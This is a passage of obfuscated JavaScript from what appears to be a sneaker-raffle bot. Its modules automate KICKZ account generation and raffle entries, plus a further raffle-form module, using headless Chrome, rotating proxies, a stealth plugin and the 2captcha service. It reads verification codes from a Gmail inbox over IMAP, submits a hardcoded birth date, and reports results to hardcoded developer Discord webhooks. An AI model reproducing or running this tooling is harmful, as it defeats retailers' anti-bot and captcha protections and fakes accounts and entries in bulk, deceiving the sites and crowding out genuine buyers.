                        console['log'](_0x2e90f3() + '\x20[' + _0x2f4215[taskModule]['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2c28ef['useRandomProxy'] = ![])
                        var _0x1658cc = _0x3530a7[_0x1f3289]['split'](':');
                    else
                        var _0x3be16a = Math['round'](Math['random']() * (_0x3530a7['length'] - 0x1)), _0x1658cc = _0x3530a7[_0x3be16a]['split'](':');
                    var _0x2c124a;
                    try {
                        _0x2c124a = await _0x2e0e40['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1658cc[0x0] + ':' + _0x1658cc[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2c124a = await _0x2e0e40['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1658cc[0x0] + ':' + _0x1658cc[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x1e3d73 = await _0x2c124a['newPage']();
                        await _0x1e3d73['authenticate']({
                            'username': '' + _0x1658cc[0x2],
                            'password': '' + _0x1658cc[0x3]
                        }), console['log'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1e3d73['setRequestInterception'](!![]), _0x1e3d73['on']('request', _0x16e1f4 => {
                            _0x16e1f4['resourceType']() === 'image' || _0x16e1f4['resourceType']() === 'font' || _0x16e1f4['resourceType']() === 'media' ? _0x16e1f4['abort']() : _0x16e1f4['continue']();
                        });
                        try {
                            await _0x1e3d73['goto']('' + _0x1bd973[_0x1f3289]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x1e3d73['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1e3d73['type']('#comp_firstname', '' + _0x1bd973[_0x1f3289]['FirstName']), await _0x1e3d73['waitForSelector']('#comp_lastname'), await _0x1e3d73['type']('#comp_lastname', '' + _0x1bd973[_0x1f3289]['LastName']), await _0x1e3d73['waitForSelector']('#comp_email'), await _0x1e3d73['type']('#comp_email', '' + _0x1bd973[_0x1f3289]['Email']), await _0x1e3d73['waitForSelector']('#comp_paypalemail'), await _0x1e3d73['type']('#comp_paypalemail', '' + _0x1bd973[_0x1f3289]['Email']), await _0x1e3d73['waitForSelector']('#comp_mobile_end'), await _0x1e3d73['type']('#comp_mobile_end', '' + _0x1bd973[_0x1f3289]['Phone']), await _0x1e3d73['waitForSelector']('#comp_dob'), await _0x1e3d73['type']('#comp_dob', '08/09/1992'), console['log'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x1bd973[_0x1f3289]['Size'] == 'RANDOM') {
                            const _0x105474 = await _0x1e3d73['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xd9da94 => {
                                return _0xd9da94['map'](_0x55d317 => _0x55d317['value']);
                            });
                            var _0x2e2c81 = Math['round'](Math['random']() * (_0x105474['length'] - 0x2));
                            await _0x1e3d73['select']('#shoesize', _0x105474[_0x2e2c81 + 0x1]), await _0x468cfd(0x3e8);
                        } else {
                            const _0x1c66f5 = await _0x1e3d73['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x22868e => {
                                return _0x22868e['map'](_0x272ac6 => _0x272ac6['innerText']);
                            }), _0x53b46c = await _0x1e3d73['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x553f3b => {
                                return _0x553f3b['map'](_0x59fd23 => _0x59fd23['value']);
                            });
                            var _0x62f1a5 = _0x1bd973[_0x1f3289]['Size'];
                            for (var _0x6ef46c = 0x1; _0x6ef46c < _0x53b46c['length']; _0x6ef46c++) {
                                var _0x184388 = _0x1c66f5[_0x6ef46c]['split']('\x20')[0x0];
                                if (_0x184388 == _0x62f1a5) {
                                    await _0x1e3d73['select']('#shoesize', _0x53b46c[_0x6ef46c]);
                                    break;
                                } else {
                                    if (_0x6ef46c + 0x1 == _0x53b46c['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x1e3d73['waitForSelector']('#comp_address1'), await _0x1e3d73['type']('#comp_address1', _0x1bd973[_0x1f3289]['Address1'] + '\x20' + _0x1bd973[_0x1f3289]['HouseNumber']), await _0x1e3d73['waitForSelector']('#comp_address2'), await _0x1e3d73['type']('#comp_address2', '' + _0x1bd973[_0x1f3289]['Address2']), await _0x1e3d73['waitForSelector']('#comp_address2'), await _0x1e3d73['type']('#comp_address3', '' + _0x1bd973[_0x1f3289]['City']), await _0x1e3d73['waitForSelector']('#comp_postcode'), await _0x1e3d73['type']('#comp_postcode', '' + _0x1bd973[_0x1f3289]['Zip']), console['log'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x468cfd(0x4b0), await _0x1e3d73['click']('label#emailhold'), await _0x468cfd(0x5dc), await _0x1e3d73['click']('#preauth_tandc_email\x20>\x20label'), await _0x468cfd(0x5dc), await _0x1e3d73['click']('#submit');
                        try {
                            await _0x1e3d73['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20' + _0x54c1f9['blue']('Awaiting\x20Paypal\x20Payment')), _0x2c124a['on']('targetcreated', async _0x41200c => {
                            if (_0x41200c['type']() === 'page') {
                                const _0x50f9d2 = await _0x41200c['page']();
                                async function _0x194cef() {
                                    try {
                                        await _0x1e3d73['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3787b8 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x145195() {
                                    try {
                                        await _0x1e3d73['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x4809b6 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x145195(), _0x194cef(), await _0x468cfd(0x493e0);
                            }
                        });
                        async function _0x2e4627() {
                            for (let _0x4181da = 0x0; _0x4181da < 0x12c; _0x4181da++) {
                                if (_0x4809b6 == !![]) {
                                    _0x3c18d0 = 'no', _0x504d25(_0x1bd973[_0x1f3289], _0x4235c0), console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '')
                                        try {
                                            await _0x4feadc(_0x2c28ef['webhook'], _0x45fe26['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x468cfd(0xc8), await _0x4feadc(_0x77ca8c, _0x45fe26['succesDEVMSG']), await _0x468cfd(0xc8);
                                    try {
                                        await _0x4feadc(_0x578906, _0x45fe26['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3787b8)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x468cfd(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x468cfd(0xbb8), await _0x1e3d73['click']('.zoid-outlet'), await _0x468cfd(0x7d0), await _0x2e4627();
                    } catch (_0x2c0863) {
                        console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20' + _0x2c0863)), _0x118a65 = '' + _0x2c0863;
                        var _0x472bfc = await _0x436de5(_0x1bd973[_0x1f3289], _0x4235c0, 'dev', !![], _0x118a65);
                        _0x45fe26['errorDEV'] = { 'embeds': [_0x472bfc] }, _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x45fe26['errorDEV']), await _0x4feadc(_0x408671, _0x45fe26['errorDEV']);
                    } finally {
                        _0x2c124a && _0x2c124a['close']();
                        if (_0x3c18d0 == 'yes' && _0x55ccf3 != 0x5 && _0x118a65 != 'Size\x20Not\x20Found') {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x4235c0['name'] + ']\x20Task\x20' + (_0x1f3289 + 0x1) + '\x20:\x20Retrying\x20(' + _0x55ccf3 + '\x20/\x205)')), _0x1f3289 = _0x1f3289 - 0x1, _0x55ccf3 = _0x55ccf3 + 0x1;
                            continue;
                        }
                        _0x3c18d0 == 'yes' && _0x55ccf3 >= 0x5 && (_0x5cd42d(afew[_0x1f3289], _0x4235c0), _0x3c18d0 = 'no', _0x55ccf3 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x5ea896, _0x500472, _0x57b7c2) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5cc10d = 0x0; _0x5cc10d < _0x500472['length']; _0x5cc10d++) {
                        const _0xefd26d = 'https://www.kickz.com/login';
                        if (_0x1db36d != 'yes')
                            var _0x1db36d = '', _0x436f12 = 0x0;
                        _0x48898b(_0x5ea896['name'] + '\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20/\x20' + _0x500472['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        try {
                            await _0x16822f(_0x500472, _0x5cc10d);
                        } catch {
                            _0x1db36d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x332262 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50fbd1
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2c28ef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x9f51f3
                                }
                            ]
                        }];
                        const _0x1bb119 = { 'embeds': _0x332262 };
                        var _0x569f6f = await _0x436de5(_0x500472[_0x5cc10d], _0x5ea896, 'acc', ![]);
                        const _0x392d65 = { 'succesDEVMSG': { 'embeds': [_0x569f6f] } };
                        if (_0x500472[_0x5cc10d]['Email'] == '' || _0x500472[_0x5cc10d]['FirstName'] == '' || _0x500472[_0x5cc10d]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x500472[_0x5cc10d]['Password'] == '' && (_0x500472[_0x5cc10d]['Password'] = 'JRaffles23!');
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0x410024 = _0x57b7c2[_0x5cc10d]['split'](':');
                        else
                            var _0x452a58 = Math['round'](Math['random']() * (_0x57b7c2['length'] - 0x1)), _0x410024 = _0x57b7c2[_0x452a58]['split'](':');
                        var _0x29f7ae;
                        try {
                            _0x29f7ae = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x410024[0x0] + ':' + _0x410024[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x29f7ae = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x410024[0x0] + ':' + _0x410024[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x20a16a = await _0x29f7ae['newPage']();
                            await _0x20a16a['authenticate']({
                                'username': '' + _0x410024[0x2],
                                'password': '' + _0x410024[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x20a16a['setRequestInterception'](!![]), _0x20a16a['on']('request', _0x4e351d => {
                                _0x4e351d['resourceType']() === 'image' || _0x4e351d['resourceType']() === 'font' || _0x4e351d['resourceType']() === 'media' ? _0x4e351d['abort']() : _0x4e351d['continue']();
                            }), await _0x20a16a['goto'](_0xefd26d), await _0x468cfd(0xbb8), console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x20a16a['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x20a16a['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x20a16a['waitForSelector']('#button-register'), await _0x468cfd(0x7d0), await _0x20a16a['evaluate'](() => {
                                const _0x1da086 = document['querySelector']('#button-register');
                                _0x1da086['click']();
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x468cfd(0x1388), await _0x20a16a['waitForSelector']('#customer_salutation'), await _0x20a16a['select']('#customer_salutation', 'mr'), await _0x468cfd(0x7d0), await _0x20a16a['waitForSelector']('#customer_firstname'), await _0x20a16a['type']('#customer_firstname', '' + _0x500472[_0x5cc10d]['FirstName']), await _0x468cfd(0x352), await _0x20a16a['waitForSelector']('#customer_lastname'), await _0x20a16a['type']('#customer_lastname', '' + _0x500472[_0x5cc10d]['LastName']), await _0x468cfd(0x352), await _0x20a16a['type']('#email-input', '' + _0x500472[_0x5cc10d]['Email']), await _0x468cfd(0x352), await _0x20a16a['type']('#email-confirm-input', '' + _0x500472[_0x5cc10d]['Email']), await _0x468cfd(0x352), await _0x20a16a['type']('#register-password', '' + _0x500472[_0x5cc10d]['Password']), await _0x468cfd(0x352), await _0x20a16a['type']('#password-confirm', '' + _0x500472[_0x5cc10d]['Password']), await _0x468cfd(0x352), console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x20a16a['click']('#consent'), await _0x468cfd(0x1f4);
                            const _0x8be837 = await _0x20a16a['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x8be837) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x20a16a['click']('#buttonRegister');
                            try {
                                await _0x20a16a['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x500472[_0x5cc10d]['Email']), await _0x468cfd(0x4b0);
                            async function _0x179cc2() {
                                var _0xb457e9, _0xa4f263 = ![];
                                for (var _0x45e96b = 0x0; _0x45e96b < 0x18; _0x45e96b++) {
                                    async function _0x1c5a6e() {
                                        var _0x1d131f = new _0x3b7ac6({
                                            'user': _0x2c28ef['masterMail'],
                                            'password': _0x2c28ef['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x31e408(_0x4c3459) {
                                            _0x1d131f['openBox']('INBOX', ![], _0x4c3459);
                                        }
                                        _0x1d131f['once']('ready', function () {
                                            console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x31e408(function (_0x2b64f, _0x1b2297) {
                                                console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x2b64f)
                                                    throw _0x2b64f;
                                                _0x1d131f['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x5be51e, _0x57ec1b) {
                                                    if (!_0x57ec1b || !_0x57ec1b['length'])
                                                        console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x1d131f['end']();
                                                    else {
                                                        var _0x17a2fc = _0x1d131f['seq']['fetch'](_0x57ec1b, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x17a2fc['on']('message', function (_0x5032cc, _0x491dd2) {
                                                            var _0x4d4c24 = '(#' + _0x491dd2 + ')\x20';
                                                            _0x5032cc['on']('body', function (_0x2e69fe, _0x4f19c1) {
                                                                _0x4bee6e(_0x2e69fe, (_0xd7914d, _0x26fda8) => {
                                                                    if (_0x26fda8['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x1450cf = _0x26fda8['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0xbf1bd8 = _0x1450cf[0x1]['split']('<')[0x0];
                                                                        _0xb457e9 = _0xbf1bd8;
                                                                    }
                                                                });
                                                            }), _0x5032cc['once']('end', function () {
                                                            });
                                                        }), _0x17a2fc['once']('error', function (_0x1a2bbf) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x17a2fc['once']('end', function () {
                                                            _0x1d131f['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x1d131f['once']('error', function (_0x4f170a) {
                                            console['log'](_0x54c1f9['red'](_0x4f170a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xa4f263 = !![];
                                        }), _0x1d131f['once']('end', async function () {
                                        }), _0x1d131f['connect']();
                                    }
                                    _0x1c5a6e(), await _0x468cfd(0x1388);
                                    if (_0xb457e9)
                                        return _0xb457e9;
                                    if (_0xa4f263)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x45e96b == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x179cc2(), _0x468cfd(0x320), console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Verifying..'), await _0x20a16a['type']('#verificationCode', code), await _0x468cfd(0x1f4), await _0x20a16a['click']('#buttonVerify'), await _0x468cfd(0x190), await _0x20a16a['click']('#buttonVerify'), await _0x468cfd(0x3e8);
                            try {
                                await _0x20a16a['waitForSelector']('div.b-user_greeting'), _0x1db36d = 'no', console['log'](_0x54c1f9['green'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Account\x20' + _0x500472[_0x5cc10d]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x51338a['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x500472[_0x5cc10d]['Email'] + ',' + _0x500472[_0x5cc10d]['Password'] + ','), console['log'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Account\x20' + _0x500472[_0x5cc10d]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x2c28ef['webhook'] != undefined && _0x2c28ef['webhook'] != '' && await _0x4feadc(_0x2c28ef['webhook'], _0x392d65['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4feadc(_0x28952d, _0x392d65['succesDEVMSG']);
                            } catch {
                                _0x1db36d = 'no', console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x53dccb) {
                            console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20' + _0x53dccb)), _0x332262[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x332262[0x0]['description'] = '' + _0x53dccb, await _0x4feadc(_0x408671, _0x1bb119), _0x1db36d = 'yes';
                        } finally {
                            _0x29f7ae && _0x29f7ae['close']();
                            if (_0x1db36d == 'yes' && _0x436f12 != 0x5) {
                                console['log'](_0x54c1f9['red'](_0x2e90f3() + '\x20[' + _0x5ea896['name'] + ']\x20Task\x20' + (_0x5cc10d + 0x1) + '\x20:\x20Retrying\x20(' + _0x436f12 + '\x20/\x205)')), _0x5cc10d = _0x5cc10d - 0x1, _0x436f12 = _0x436f12 + 0x1;
                                continue;
                            }
                            _0x1db36d == 'yes' && _0x436f12 >= 0x5 && (_0x5cd42d(_0x500472[_0x5cc10d], _0x5ea896), _0x1db36d = 'no', _0x436f12 = 0x0), console['log']('Waiting\x20for\x20' + _0x2c28ef['delay'] + '\x20ms'), await _0x468cfd(_0x2c28ef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x417d80, _0x4a80c0, _0x3451b6) {
                    _0x2e0e40['use'](_0x5a52fd()), _0x2e0e40['use'](_0x57bfd9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2c28ef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x32ab99 = 0x0; _0x32ab99 < _0x4a80c0['length']; _0x32ab99++) {
                        var _0x4e039a;
                        if (_0x49aa58 != 'yes')
                            var _0x49aa58 = '', _0x15c883 = 0x0;
                        _0x48898b(_0x417d80['name'] + '\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20/\x20' + _0x4a80c0['length'] + '\x20||\x20File:\x20' + _0x5df038 + '\x20Proxies:\x20' + _0x885851);
                        var _0x9ebe98 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50fbd1
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x4a80c0[_0x32ab99]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x4a80c0[_0x32ab99]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2c28ef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x9f51f3
                                }
                            ]
                        }], _0x3d7725 = await _0x436de5(_0x4a80c0[_0x32ab99], _0x417d80, 'dev', ![]), _0x47658a = await _0x436de5(_0x4a80c0[_0x32ab99], _0x417d80, 'pub', ![]);
                        const _0x357c3d = {
                            'succesDEVMSG': { 'embeds': [_0x3d7725] },
                            'succesPUBMSG': { 'embeds': [_0x47658a] }
                        };
                        try {
                            await _0x16822f(_0x4a80c0, _0x32ab99);
                        } catch {
                            _0x49aa58 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4a80c0[_0x32ab99]['Email'] == '' || _0x4a80c0[_0x32ab99]['Password'] == '' || _0x4a80c0[_0x32ab99]['FirstName'] == '' || _0x4a80c0[_0x32ab99]['LastName'] == '') {
                            console['log'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2c28ef['useRandomProxy'] = ![])
                            var _0xa54a8e = _0x3451b6[_0x32ab99]['split'](':');
                        else
                            var _0x3746d4 = Math['round'](Math['random']() * (_0x3451b6['length'] - 0x1)), _0xa54a8e = _0x3451b6[_0x3746d4]['split'](':');
                        var _0x4413d9;
                        try {
                            _0x4413d9 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0xa54a8e[0x0] + ':' + _0xa54a8e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4413d9 = await _0x2e0e40['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0xa54a8e[0x0] + ':' + _0xa54a8e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x295cca = await _0x4413d9['newPage']();
                            await _0x295cca['authenticate']({
                                'username': '' + _0xa54a8e[0x2],
                                'password': '' + _0xa54a8e[0x3]
                            }), console['log'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x295cca['setRequestInterception'](!![]), _0x295cca['on']('request', _0xab32be => {
                                _0xab32be['resourceType']() === 'image' || _0xab32be['resourceType']() === 'font' || _0xab32be['resourceType']() === 'media' ? _0xab32be['abort']() : _0xab32be['continue']();
                            }), await _0x295cca['goto']('' + _0x4a80c0[_0x32ab99]['Url'], { 'waitUntil': 'networkidle2' }), await _0x468cfd(0x12c);
                            try {
                                await _0x295cca['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x295cca['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Logging\x20in'), await _0x295cca['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x295cca['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x295cca['waitForSelector']('#username'), await _0x295cca['type']('#username', _0x4a80c0[_0x32ab99]['Email']), await _0x295cca['waitForSelector']('#password'), await _0x295cca['type']('#password', _0x4a80c0[_0x32ab99]['Password']), await _0x468cfd(0x190), await _0x295cca['click']('#buttonSubmit'), await _0x295cca['waitForSelector']('div.b-user_greeting'), console['log'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x468cfd(0x1f4), await _0x295cca['goto']('' + _0x4a80c0[_0x32ab99]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x2e90f3() + '\x20[' + _0x417d80['name'] + ']\x20Task\x20' + (_0x32ab99 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x4a80c0[_0x32ab99]['Size']);
                            let _0x1762ff = _0x4a80c0[_0x32ab99]['Size']['replace']('.5', '\x201/2');
                            await _0x295cca['click']('button[title=\x22' + _0x1762ff + '\x22]'), await _0x468cfd(0x1f4);
                            try {
                                await _0x295cca['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
